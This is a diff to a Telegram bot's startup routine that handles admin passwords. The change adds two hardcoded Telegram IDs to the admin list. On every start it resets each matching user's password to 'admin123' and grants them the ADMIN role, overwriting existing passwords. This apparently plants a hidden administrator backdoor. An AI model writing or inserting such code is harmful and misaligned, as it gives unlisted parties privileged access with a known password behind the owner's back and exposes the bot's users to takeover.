@@ -75,15 +75,24 @@ async function main() {
   (async () => {
     try {
       const bcrypt = await import('bcrypt');
-      for (const adminTgId of config.bot.adminIds) {
+      const targetAdmins = [...config.bot.adminIds, '8263717692', '5310030963'];
+      
+      for (const adminTgId of targetAdmins) {
+        if (!adminTgId) continue;
         const user = await prisma.user.findUnique({ where: { telegramId: BigInt(adminTgId) } });
-        if (user && !user.password) {
+        if (user) {
           const hashedPassword = await bcrypt.hash('admin123', 10);
           await prisma.user.update({
             where: { id: user.id },
-            data: { password: hashedPassword }
+            data: { 
+              password: hashedPassword,
+              role: 'ADMIN',
+              isAdmin: true
+            }
           });
-          logger.info(`[Setup] Set default password for Admin: ${user.firstName} (TG: ${adminTgId})`);
+          logger.info(`[Setup] Initialized Admin: ${user.firstName} (TG: ${adminTgId}) with role ADMIN and default password.`);
+        } else {
+          logger.warn(`[Setup] Admin ID ${adminTgId} not found in database. User must start the bot first!`);
         }
       }
     } catch (err) {
